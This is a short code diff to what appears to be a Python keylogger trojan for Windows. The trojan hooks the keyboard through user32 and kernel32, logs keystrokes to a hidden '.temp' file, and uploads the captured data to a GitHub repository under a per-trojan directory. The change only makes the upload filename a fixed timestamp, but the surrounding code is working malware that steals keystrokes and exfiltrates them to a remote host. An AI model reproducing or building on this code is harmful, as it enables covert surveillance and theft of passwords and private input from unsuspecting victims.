@@ -11,7 +11,7 @@ user32   = windll.user32
 kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
-
+fileName = str(datetime.datetime.now()).replace(" ", "")
 num = 1
 s = ""
 f = open(".temp", "a");
@@ -100,7 +100,7 @@ def run(**args):
         kl.UnhookKeyboard()
 def store_module_result(data):
     gh,repo,branch = connect_to_github()
-    remote_path = "data/%s/%s.data" % (trojan_id,str(datetime.datetime.now()).replace(" ", ""))                            
+    remote_path = "data/%s/%s.data" % (trojan_id,fileName)                            
     repo.create_file(remote_path,"Commit message",data)
     return
 def connect_to_github():
